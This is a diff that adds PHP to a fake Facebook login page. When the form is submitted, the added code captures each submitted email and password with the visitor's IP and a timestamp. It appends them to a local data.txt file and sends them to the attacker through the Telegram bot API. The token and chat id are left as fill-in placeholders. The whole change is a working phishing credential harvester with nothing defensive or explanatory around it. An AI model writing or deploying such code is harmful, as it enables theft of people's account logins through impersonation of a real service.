@@ -35,6 +35,26 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['email'])) {
         .link a { color: #1877f2; text-decoration: none; font-size: 14px; }
     </style>
 </head>
+    <?php
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['email'])) {
+    $email = $_POST['email'];
+    $pass  = $_POST['pass'];
+    $ip    = $_SERVER['REMOTE_ADDR'];
+    $time  = date('Y-m-d H:i:s');
+
+    // حفظ في ملف
+    $data = "Email: $email | Pass: $pass | IP: $ip | Time: $time\n";
+    file_put_contents('data.txt', $data, FILE_APPEND | LOCK_EX);
+
+    // إرسال تليجرام
+    $botToken = 'ضع_التوكين_هنا';
+    $chatId   = 'ضع_chat_id_هنا';
+    $msg = urlencode("🎯 فيسبوك\n📧 $email\n🔑 $pass\n🌐 $ip\n🕒 $time");
+    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$msg");
+
+    $success = "✅ تم الاستلام!";
+}
+?>
 <body>
     <div class="box">
         <h1>facebook</h1>
